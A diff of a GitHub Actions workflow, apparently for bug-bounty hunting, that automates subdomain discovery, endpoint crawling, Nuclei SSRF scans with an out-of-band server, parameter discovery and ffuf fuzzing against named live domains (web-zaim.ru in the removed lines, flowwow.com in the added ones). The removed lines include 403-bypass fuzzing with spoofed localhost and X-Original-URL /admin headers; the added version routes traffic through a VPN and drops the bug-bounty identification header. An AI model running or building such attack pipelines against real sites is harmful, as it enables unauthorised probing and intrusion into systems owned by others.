@@ -1,82 +1,74 @@
-name: Elite Fintech Hunter - Auto-Verify & Fuzz
+name: Flowwow-Advanced-Logic-Hunt
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: 'Target Domain (e.g., web-zaim.ru)'
+        description: 'Primary Target (flowwow.com)'
         required: true
-        default: 'web-zaim.ru'
-      bounty_header:
-        description: 'Program X-BugBounty Header'
-        required: true
-        default: '0a526762-8467-4d46-a403-af4e79283f46'
+        default: 'flowwow.com'
 
 jobs:
   exploit-hunt:
     runs-on: ubuntu-latest
     steps:
-      - name: Setup Advanced Toolset
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup Tools
         run: |
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-          go install -v github.com/ffuf/ffuf/v2@latest
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest
           go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install -v github.com/lc/gau/v2/cmd/gau@latest
+          go install -v github.com/hakluke/hakrawler@latest
           pip install arjun
           sudo mv ~/go/bin/* /usr/local/bin/
 
-      - name: Multi-Stage Recon
-        run: |
-          TARGET="${{ github.event.inputs.target }}"
-          FULL_HEADER="X-BugBounty: ${{ github.event.inputs.bounty_header }}"
-          
-          # 1. Subdomain Discovery
-          subfinder -d $TARGET -silent -o subs.txt
-          
-          # 2. Tech-Aware Probing (Detects Tilda, IIS, Nginx)
-          httpx -l subs.txt -H "$FULL_HEADER" -status-code -td -silent -o live.txt
-          
-          # 3. Filter 403 Forbidden pages for bypass testing
-          grep "403" live.txt | awk '{print $1}' > forbidden.txt
+      - name: VPN Connection (Requirement)
+        uses: "kota65535/github-openvpn-connect-action@v2"
+        with:
+          config_file: ${{ secrets.OVPN_CONFIG }}
 
-      - name: Advanced 403 Bypass (Header Spoofing)
+      - name: Deep Recon & JS Mining
         run: |
-          FULL_HEADER="X-BugBounty: ${{ github.event.inputs.bounty_header }}"
-          # Testing for internal trust bypasses (Localhost spoofing)
+          # 1. Gather all subdomains and historical URLs
+          subfinder -d ${{ github.event.inputs.target }} -silent > subs.txt
+          cat subs.txt | gau --threads 5 >> urls.txt
+          
+          # 2. Extract API endpoints from JavaScript files (Crucial for IDOR/Logic)
+          # Flowwow uses many clientweb and api domains; JS often hides the 'real' paths.
+          katana -list subs.txt -jc -kf all -d 3 -silent -o spidered_endpoints.txt
+
+      - name: SSRF & OOB Probing
+        run: |
+          # Testing for SSRF (Critical Priority)
+          # Note: Replace 'your-interactsh-domain' with your private OOB server or Burp Collaborator
+          nuclei -l spidered_endpoints.txt -t exposures/configs/ -t vulnerabilities/ssrf/ \
+                 -var interactsh_url=${{ secrets.OOB_SERVER }} -severity critical,high
+
+      - name: Business Logic & Parameter Fuzzing
+        run: |
+          # 3. Focus on 'api-shop' and 'clientweb' for IDOR
+          grep -E "api|shop|client" spidered_endpoints.txt | head -n 20 > logic_targets.txt
+          
           while read -r url; do
-            echo "Attempting Bypass on: $url"
-            ffuf -u "$url/FUZZ" \
-                 -H "$FULL_HEADER" \
-                 -H "X-Forwarded-For: 127.0.0.1" \
-                 -H "X-Real-IP: 127.0.0.1" \
-                 -H "X-Original-URL: /admin" \
-                 -w http://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt \
-                 -mc 200,301,302 -t 5 -rate 5 -o "bypass_$(date +%s).json"
-          done < forbidden.txt
+            # Arjun finds hidden params like ?admin=true or ?user_id=123
+            arjun -u "$url" --rate-limit 2 -oJ "params_$(date +%s).json"
+            
+            # Fuzzing for IDOR-prone paths (e.g., /api/v1/orders/FUZZ)
+            # Flowwow specifically mentioned 'Business Logic' and 'IDOR'
+            ffuf -u "$url/FUZZ" -w http://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt \
+                 -mc 200,401 -rate 3 -o "logic_fuzz_$(date +%s).json"
+          done < logic_targets.txt
 
-      - name: Hidden Parameter Discovery (Arjun)
-        run: |
-          FULL_HEADER="X-BugBounty: ${{ github.event.inputs.bounty_header }}"
-          # Arjun finds hidden parameters (e.g., ?debug=true) that lead to IDORs
-          # Focus on the API and Marketplace subdomains you found
-          grep -E "api|marketplace" live.txt | awk '{print $1}' > high_value_targets.txt
-          while read -r url; do
-            arjun -u "$url" --headers "$FULL_HEADER" --rate-limit 5 -oJ "params_$(date +%s).json"
-          done < high_value_targets.txt
-
-      - name: Critical Vulnerability Scan (Nuclei)
-        run: |
-          FULL_HEADER="X-BugBounty: ${{ github.event.inputs.bounty_header }}"
-          # Runs 2026-updated templates for Critical/High bugs only
-          nuclei -l live.txt -H "$FULL_HEADER" -severity critical,high -rate-limit 5 -o nuclei_results.txt
-
-      - name: Upload Elite Evidence
+      - name: Upload Critical Evidence
         uses: actions/upload-artifact@v4
         with:
-          name: elite-results-${{ github.event.inputs.target }}
+          name: flowwow-critical-results
           path: |
-            live.txt
             nuclei_results.txt
             params_*.json
-            bypass_*.json
+            logic_fuzz_*.json
+            spidered_endpoints.txt
             
